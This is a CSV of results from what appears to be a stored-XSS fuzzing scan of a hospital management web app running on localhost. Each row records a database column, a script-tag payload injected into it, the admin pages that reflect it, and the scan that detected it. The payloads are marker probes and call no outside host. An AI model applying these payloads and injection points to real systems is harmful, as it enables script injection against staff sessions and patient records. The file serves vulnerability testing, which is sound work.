web app,DB source,reflection sink,id,payload,description
hospital,tblpatient.PatientName,"http://localhost/hospital/hms/admin/manage-patient.php
http://localhost/hospital/hms/admin/manage-patient.php#
http://localhost/hospital/hms/admin/view-patient.php?viewid=1",976526,"""'><script>xss(976526)</script>","
            hms.tblpatient.PatientName[0][2]
            original row: [1, 1, 'Amit Kumar', 1231231230, 'amitk@gmail.com', 'male', 'New Delhi india', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            fuzzed row: [1, 1, '""\'><script>xss(976526)</script>', 1231231230, 'amitk@gmail.com', 'male', 'New Delhi india', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            change: 'Amit Kumar' => '""'><script>xss(976526)</script>'
            
fuzzed after scan 29 / 41
found as XSS in scan 30 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",977529,"""'><script>xss(977529)</script>","
            hms.doctorspecilization.specilization[14][1]
            original row: [15, 'Neurologists', datetime.datetime(2022, 10, 30, 18, 12, 30), None]
            fuzzed row: [15, '""\'><script>xss(977529)</script>', datetime.datetime(2022, 10, 30, 18, 12, 30), None]
            change: 'Neurologists' => '""'><script>xss(977529)</script>'
            
fuzzed after scan 9 / 41
found as XSS in scan 10 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",979875,"""'><script>xss(979875)</script>","
            hms.doctorspecilization.specilization[10][1]
            original row: [11, 'ENT', datetime.datetime(2022, 10, 30, 18, 11, 30), None]
            fuzzed row: [11, '""\'><script>xss(979875)</script>', datetime.datetime(2022, 10, 30, 18, 11, 30), None]
            change: 'ENT' => '""'><script>xss(979875)</script>'
            
fuzzed after scan 9 / 41
found as XSS in scan 10 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",980937,"""'><script>xss(980937)</script>","
            hms.doctorslog.logout[3][5]
            original row: [23, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 8, 56), '06-11-2022 05:42:53 PM', 1]
            fuzzed row: [23, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 8, 56), '""\'><script>xss(980937)</script>', 1]
            change: '06-11-2022 05:42:53 PM' => '""'><script>xss(980937)</script>'
            
fuzzed after scan 28 / 41
found as XSS in scan 29 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",981616,"""'><script>xss(981616)</script>","
            hms.doctorslog.username[8][2]
            original row: [28, 1, 'anujk123@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 38, 7), None, 1]
            fuzzed row: [28, 1, '""\'><script>xss(981616)</script>', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 38, 7), None, 1]
            change: 'anujk123@test.com' => '""'><script>xss(981616)</script>'
            
fuzzed after scan 27 / 41
found as XSS in scan 28 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",984340,"""'><script>xss(984340)</script>","
            hms.doctorspecilization.specilization[12][1]
            original row: [13, 'Dermatologists', datetime.datetime(2022, 10, 30, 18, 12, 2), None]
            fuzzed row: [13, '""\'><script>xss(984340)</script>', datetime.datetime(2022, 10, 30, 18, 12, 2), None]
            change: 'Dermatologists' => '""'><script>xss(984340)</script>'
            
fuzzed after scan 9 / 41
found as XSS in scan 10 / 41"
hospital,userlog.username,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",987264,"""'><script>xss(987264)</script>","
            hms.userlog.username[2][2]
            original row: [3, None, 'amitk@gmail.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 43), None, 0]
            fuzzed row: [3, None, '""\'><script>xss(987264)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 43), None, 0]
            change: 'amitk@gmail.com' => '""'><script>xss(987264)</script>'
            
fuzzed after scan 19 / 41
found as XSS in scan 20 / 41"
hospital,users.fullName,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#
http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",987545,"""'><script>xss(987545)</script>","
            hms.users.fullName[0][1]
            original row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            fuzzed row: [1, '""\'><script>xss(987545)</script>', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            change: 'John Doe' => '""'><script>xss(987545)</script>'
            
fuzzed after scan 21 / 41
found as XSS in scan 22 / 41"
hospital,tblmedicalhistory.BloodSugar,http://localhost/hospital/hms/admin/view-patient.php?viewid=1,987616,"""'><script>xss(987616)</script>","
            hms.tblmedicalhistory.BloodSugar[0][3]
            original row: [1, 1, '80/120', '120', '85', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            fuzzed row: [1, 1, '80/120', '""\'><script>xss(987616)</script>', '85', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            change: '120' => '""'><script>xss(987616)</script>'
            
fuzzed after scan 38 / 41
found as XSS in scan 39 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",988586,"""'><script>xss(988586)</script>","
            hms.doctorslog.logout[6][5]
            original row: [26, 1, 'anujk123@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 17, 33), '06-11-2022 06:50:28 PM', 1]
            fuzzed row: [26, 1, 'anujk123@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 17, 33), '""\'><script>xss(988586)</script>', 1]
            change: '06-11-2022 06:50:28 PM' => '""'><script>xss(988586)</script>'
            
fuzzed after scan 28 / 41
found as XSS in scan 29 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",988798,"""'><script>xss(988798)</script>","
            hms.doctorslog.username[2][2]
            original row: [22, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 6, 37), '06-11-2022 05:36:40 PM', 1]
            fuzzed row: [22, 2, '""\'><script>xss(988798)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 6, 37), '06-11-2022 05:36:40 PM', 1]
            change: 'charudua12@test.com' => '""'><script>xss(988798)</script>'
            
fuzzed after scan 27 / 41
found as XSS in scan 28 / 41"
hospital,userlog.username,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",989225,"""'><script>xss(989225)</script>","
            hms.userlog.username[3][2]
            original row: [4, 2, 'amitk@gmail.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 58), '06-11-2022 06:50:46 PM', 1]
            fuzzed row: [4, 2, '""\'><script>xss(989225)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 58), '06-11-2022 06:50:46 PM', 1]
            change: 'amitk@gmail.com' => '""'><script>xss(989225)</script>'
            
fuzzed after scan 19 / 41
found as XSS in scan 20 / 41"
hospital,tblpage.OpenningTime,http://localhost/hospital/index.php,991030,"""'><script>xss(991030)</script>","
            hms.tblpage.OpenningTime[1][7]
            original row: [2, 'contactus', 'Contact Details', 'D-204, Hole Town South West, Delhi-110096,India', 'info@gmail.com', 1122334455, datetime.datetime(2020, 5, 20, 7, 24, 7), '9 am To 8 Pm']
            fuzzed row: [2, 'contactus', 'Contact Details', 'D-204, Hole Town South West, Delhi-110096,India', 'info@gmail.com', 1122334455, datetime.datetime(2020, 5, 20, 7, 24, 7), '""\'><script>xss(991030)</script>']
            change: '9 am To 8 Pm' => '""'><script>xss(991030)</script>'
            
fuzzed after scan 18 / 41
found as XSS in scan 19 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",994462,"""'><script>xss(994462)</script>","
            hms.doctorspecilization.specilization[9][1]
            original row: [10, 'Pathology', datetime.datetime(2022, 10, 30, 18, 11, 22), None]
            fuzzed row: [10, '""\'><script>xss(994462)</script>', datetime.datetime(2022, 10, 30, 18, 11, 22), None]
            change: 'Pathology' => '""'><script>xss(994462)</script>'
            
fuzzed after scan 9 / 41
found as XSS in scan 10 / 41"
hospital,userlog.username,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",994713,"""'><script>xss(994713)</script>","
            hms.userlog.username[4][2]
            original row: [5, 1, 'johndoe12@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 14), '06-03-2023 01:02:22 PM', 1]
            fuzzed row: [5, 1, '""\'><script>xss(994713)</script>', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 14), '06-03-2023 01:02:22 PM', 1]
            change: 'johndoe12@test.com' => '""'><script>xss(994713)</script>'
            
fuzzed after scan 19 / 41
found as XSS in scan 20 / 41"
hospital,tblmedicalhistory.MedicalPres,http://localhost/hospital/hms/admin/view-patient.php?viewid=1,998215,"""'><script>xss(998215)</script>","
            hms.tblmedicalhistory.MedicalPres[0][6]
            original row: [1, 1, '80/120', '120', '85', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            fuzzed row: [1, 1, '80/120', '120', '85', '98', '""\'><script>xss(998215)</script>', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            change: 'Test' => '""'><script>xss(998215)</script>'
            
fuzzed after scan 41 / 41
found as XSS in scan 42 / 41"
hospital,tblcontactus.AdminRemark,http://localhost/hospital/hms/admin/query-details.php?id=2,998788,"""'><script>xss(998788)</script>","
            hms.tblcontactus.AdminRemark[1][6]
            original row: [2, 'Anuj kumar', 'ak@gmail.com', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), 'Contact the patient', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            fuzzed row: [2, 'Anuj kumar', 'ak@gmail.com', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), '""\'><script>xss(998788)</script>', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            change: 'Contact the patient' => '""'><script>xss(998788)</script>'
            
fuzzed after scan 13 / 41
found as XSS in scan 14 / 41"
